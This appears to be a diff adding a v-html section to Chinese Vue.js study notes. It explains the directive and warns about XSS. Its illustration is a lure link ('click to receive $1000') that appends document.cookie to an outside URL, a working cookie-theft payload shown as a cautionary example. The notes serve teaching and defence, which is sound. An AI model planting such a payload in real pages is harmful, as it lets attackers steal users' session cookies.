@@ -25,6 +25,7 @@
     - [过滤器(filter)](#过滤器filter)
   - [内置指令](#内置指令)
     - [v-text](#v-text)
+    - [v-html](#v-html)
 
 <!-- /TOC -->
 
@@ -1563,3 +1564,28 @@
 2. 🐖注意
     - 使用 `v-text` 会完全替换节点内容, 尽管节点中可能有数据. 如果只想部分更新节点内容, 使用 `mustache` 语法: `{{}}`
     - `v-text` 只会渲染文本内容, 不会解析 `HTML` 标签
+### v-html
+1. 更新元素的 `innerHTML`
+    - 内容按照普通 `HTML` 插入, 不会作为 `Vue` 模板编译
+    - ```html
+      <div v-html="str"></div>
+    - ```js
+      data: {
+        str: '<h1>hello</h1>'
+      },
+    - ![](../image/Snipaste_2021-12-09_21-45-41.png)
+2. 🐖注意: 在网站上动态渲染任意 HTML 是非常危险的, 因为容易导致 XSS 攻击. **只在**可信任的内容上使用 `v-html`, **永不**用在在用户提交内容上
+    - 下面看一个例子
+    - 我们先在网站上加上两个 `cookie`
+    - ![](../image/Snipaste_2021-12-09_21-56-15.png)
+    - 然后在页面增加代码
+    - ```html
+      <div v-html="url"></div>
+    - ```js
+      data: {
+        url: `<a href="https://www.baidu.com?${document.cookie}">点我立刻到账$1000</>`
+      }
+    - ![](../image/Snipaste_2021-12-09_22-05-33.png)
+    - 点击链接之后
+    - ![](../image/Snipaste_2021-12-09_22-05-55.png)
+    - 如果你登陆的是银行的网站, 那么一旦你点击了非法链接, 对方就会获取你的 `cookie`, 进而掌握你的账户信息等.
